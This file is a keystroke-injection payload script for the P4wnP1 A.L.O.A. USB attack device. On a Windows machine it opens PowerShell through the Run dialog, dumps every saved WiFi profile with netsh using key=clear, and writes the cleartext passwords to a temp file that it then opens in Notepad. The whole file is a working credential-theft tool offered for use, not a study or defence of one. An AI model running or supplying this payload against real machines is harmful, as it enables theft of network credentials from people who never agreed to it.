// WiFi Password Dump Payload (Windows)
// Extracts saved WiFi passwords and displays them
// Compatible with P4wnP1 A.L.O.A

layout('us'); // Set keyboard layout

// Wait for system to be ready
delay(3000);

// Open Run dialog
press("GUI r");
delay(500);

// Open PowerShell
type("powershell\n");
delay(2000);

// Create script to extract WiFi passwords
type("$wifiProfiles = (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}\n");
delay(500);

type("$results = @()\n");
delay(100);
type("$results += 'WiFi Password Dump'\n");
delay(100);
type("$results += '=' * 50\n");
delay(100);
type("$results += ''\n");
delay(100);

type("foreach ($profile in $wifiProfiles) {\n");
delay(100);
type("    $profileInfo = (netsh wlan show profile name=$profile key=clear)\n");
delay(100);
type("    $password = ($profileInfo | Select-String 'Key Content\\W+\\:(.+)$') | %{$_.Matches.Groups[1].Value.Trim()}\n");
delay(100);
type("    $results += \"SSID: $profile\"\n");
delay(100);
type("    if ($password) {\n");
delay(100);
type("        $results += \"Password: $password\"\n");
delay(100);
type("    } else {\n");
delay(100);
type("        $results += \"Password: (none or open network)\"\n");
delay(100);
type("    }\n");
delay(100);
type("    $results += ''\n");
delay(100);
type("}\n");
delay(500);

// Save to file
type("$results | Out-File -FilePath $env:TEMP\\wifi_passwords.txt\n");
delay(500);

// Open the file
type("notepad $env:TEMP\\wifi_passwords.txt\n");
delay(1000);

// Close PowerShell
type("exit\n");
